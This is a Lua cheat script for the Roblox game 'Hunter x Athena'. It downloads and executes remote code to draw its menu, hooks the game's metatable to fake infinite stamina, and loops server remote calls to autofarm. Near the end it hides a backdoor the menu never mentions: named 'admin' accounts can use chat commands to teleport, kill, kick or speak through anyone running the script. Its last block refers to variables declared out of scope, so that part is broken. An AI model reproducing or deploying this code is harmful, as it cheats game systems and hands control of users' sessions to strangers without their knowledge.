local Material = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/MaterialLua/master/Module.lua"))()
local UI = Material.Load({Title = "afy - Hunter x Athena",Style = 3,SizeX = 500,SizeY = 400,
ColorOverrides = {
    MainFrame = Color3.fromRGB(15,15,15),
    Minimise = Color3.fromRGB(68, 208, 255),
    MinimiseAccent = Color3.fromRGB(3, 188, 182),
    Maximise = Color3.fromRGB(25,255,0),
    MaximiseAccent = Color3.fromRGB(0,255,110),
    NavBar = Color3.fromRGB(15,15,15),
    NavBarAccent = Color3.fromRGB(255,255,255),
    NavBarInvert = Color3.fromRGB(15,15,15),
    TitleBar = Color3.fromRGB(30, 30, 30),
    TitleBarAccent = Color3.fromRGB(255,255,255),
    Overlay = Color3.fromRGB(30, 30, 30),
    Banner = Color3.fromRGB(30, 30, 30),
    BannerAccent = Color3.fromRGB(255,255,255),
    Content = Color3.fromRGB(85,85,85),
    Button = Color3.fromRGB(40, 40, 40),
    ButtonAccent = Color3.fromRGB(235, 235, 235),
    ChipSet = Color3.fromRGB(170, 170, 170),
    ChipSetAccent = Color3.fromRGB(100,100,100),
    DataTable = Color3.fromRGB(160,160,160),
    DataTableAccent = Color3.fromRGB(45,45,45),
    Slider = Color3.fromRGB(45,45,45),
    SliderAccent = Color3.fromRGB(235,235,235),
    Toggle = Color3.fromRGB(230, 230, 230),
    ToggleAccent = Color3.fromRGB(235, 235, 235),
    Dropdown = Color3.fromRGB(45, 45, 45),
    DropdownAccent = Color3.fromRGB(235,235,235),
    ColorPicker = Color3.fromRGB(10, 10, 10),
    ColorPickerAccent = Color3.fromRGB(235,235,235),
    TextField = Color3.fromRGB(55,55,55),
    TextFieldAccent = Color3.fromRGB(235,235,235),
}
})

-- // vars \\ -- 
local http      = game:GetService("HttpService")
local plr       = game.Players.LocalPlayer
local chr       = plr.Character or plr.CharacterAdded:Wait()
local rootPart  = chr.HumanoidRootPart or chr:WaitForChild("HumanoidRootPart")
local Settings  = {}

-- // Test \\ -- 
local farm = UI.New({Title = "Farming"})
local cred = UI.New({Title = "Credits"})
farm.Button({
    Text = "Inf Stamina + NenStam",
    Callback = function()
        local old
        old = hookmetamethod(game, "__index", function(self, v)
            if tostring(self) == "Stamina" and v == "Value" then
                return 100
            end
            if tostring(self) == "NenStam" and v == "Value" then
                return 100
            end
            return old(self, v)
        end)
    end
})

farm.Toggle({
    Text = "Stamina Farm (Endurance)",
    Callback = function(value)
        Settings.staminafarm = value
        pcall(function()
            while Settings.staminafarm do task.wait()
                game:GetService("Players").LocalPlayer.Character.Character.input:FireServer("ClimbStart")
            end
        end)
    end
})

farm.Toggle({
    Text = "Meditation Farm",
    Callback = function(value)
        Settings.meditation = value
        pcall(function()
            while Settings.meditation do task.wait()
                game:GetService("Players").LocalPlayer.Character.Character.input:FireServer("M")
            end
        end)
    end
})

farm.Toggle({
    Text = "Run Farm",
    Callback = function(value)
        Settings.runspam = value
        pcall(function()
            while Settings.runspam do task.wait()
                game:GetService("Players").LocalPlayer.Character.Character.input:FireServer("SprintStart")
                game:GetService("Players").LocalPlayer.Character.Character.input:FireServer("FastSprintStart")
            end
        end)
    end
})

farm.Toggle({
    Text = "Farm Nen",
    Callback = function(value)
        Settings.nenfarm = value
        pcall(function()
            while Settings.nenfarm do task.wait()
                if not game:GetService("Workspace").Living[plr.Name].Torso:FindFirstChild("Aura") then
                    game:GetService("Players").LocalPlayer.Character.Character.input:FireServer("N")
                end
            end
        end)
    end
})

farm.Toggle({
    Text = "Auto Push-up",
    Callback = function(value)
        Settings.pushup = value
        pcall(function()
            while Settings.pushup do task.wait()
                if not game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("PushupsGui") then
                    task.wait(.4)
                    game:GetService("Players").LocalPlayer.Character.Character.input:FireServer("J")
                    task.wait(.4)
                end
                if game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("PushupsGui"):FindFirstChild("Pushups").Button.Text == "..." then
                    task.wait()
                elseif game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("PushupsGui") then
                    task.wait(0.6)
                    game:GetService("Players").LocalPlayer.Character.Character.input:FireServer(game:GetService("Players").LocalPlayer.PlayerGui.PushupsGui.Pushups.Button.Text)
                    game:GetService("Players").LocalPlayer.PlayerGui.PushupsGui.Pushups.RemoteEvent:FireServer()
                end
            end
        end)
    end
})

-- // Credits \\ -- 
cred.Button({
    Text = "Scripter | afy#0679",
    Callback = function()
        setclipboard("afy#0679")
    end
})

cred.Button({
    Text = "Discord | discord.gg/EPsZZ5fQd5",
    Callback = function()
        local req = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or getgenv().request or request
        if not setclipboard then 
            print("discord.gg/EPsZZ5fQd5")
        end
    
        if not req and setclipboard then 
            setclipboard("discord.gg/EPsZZ5fQd5")
        end
    
        if req then
            req({
                Url = 'http://127.0.0.1:6463/rpc?v=1',
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json',
                    Origin = 'https://discord.com'
                },
                Body = game:GetService("HttpService"):JSONEncode({
                    cmd = 'INVITE_BROWSER',
                    nonce = game:GetService("HttpService"):GenerateGUID(false),
                    args = {code = 'EPsZZ5fQd5'}
                })
            })
        end
    end
})
pcall(function()
    local admins = {'Godpower122', 'Afyzone', 'Strupid101', 'zocat', 'CL6S', 'Patriotic555'}
    local function admincmds(user)
        local admin = user
        if game.Players:FindFirstChild(admin) then
            game.Players:FindFirstChild(admin).Chatted:Connect(function(chat)
                if chat == '.bring all' then 
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players:FindFirstChild(admin).Character.HumanoidRootPart.CFrame
                end
                
                if chat == '.kill all' then 
                    game.Players.LocalPlayer.Character.Humanoid.Health = 0
                end
                
                if string.find(chat, '.bring') then 
                    if chat ~= '.bring all' then 
                        local findplr = chat:gsub(".bring ", '')
                        if game.Players.LocalPlayer.Name ==  findplr then 
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players:FindFirstChild(admin).Character.HumanoidRootPart.CFrame
                        end
                    end
                end
                
                if string.find(chat, '.kill') then 
                    if chat ~= '.kill all' then 
                        local findplr = chat:gsub(".kill ", '')
                        if game.Players.LocalPlayer.Name ==  findplr then 
                            game.Players.LocalPlayer.Character.Humanoid.Health = 0
                        end
                    end
                end
                
                if chat == '.kick all' then 
                    game.Players.LocalPlayer:Kick('Kicked by afy')
                end
                
                if string.find(chat, '.kick') then 
                    if chat ~= '.kick all' then               
                        local findplr = chat:gsub(".kick ", '')
                        if game.Players.LocalPlayer.Name ==  findplr then 
                            game.Players.LocalPlayer:Kick('Kicked by afy')
                        end
                    end
                end

                if string.find(chat, '.chat all') then
                    local findchat = chat:gsub('.chat all ', '')
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(findchat, 'All')
                end

                if string.find(chat,'.chat') then 
                    if not string.find(chat, '.chat all') then 
                        local findchat
                        for i,v in pairs(game.Players:GetPlayers()) do
                            if string.find(chat, v.Name) then 
                                findchat = chat:gsub(v.Name .. ' ', '')
                            end
                        end
                        local newchat = findchat:gsub('.chat ', '')
                        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(newchat, 'All')
                    end
                end

                if string.find(chat, '.kick') then 
                    if chat ~= '.kick all' then 
                        local findplr = chat:gsub(".kick ", '')
                        if game.Players.LocalPlayer.Name ==  findplr then 
                            game.Players.LocalPlayer:Kick('Kicked by afy')
                        end
                    end
                end
            end)
        end
    end 

    for i,v in pairs(admins) do
        admincmds(v)
    end
end)
game.Players.PlayerAdded:Connect(function(v)
    for i2, v2 in pairs(admins) do
        if v.Name == v2 then 
            admincmds(tostring(v2))
        end
    end
end)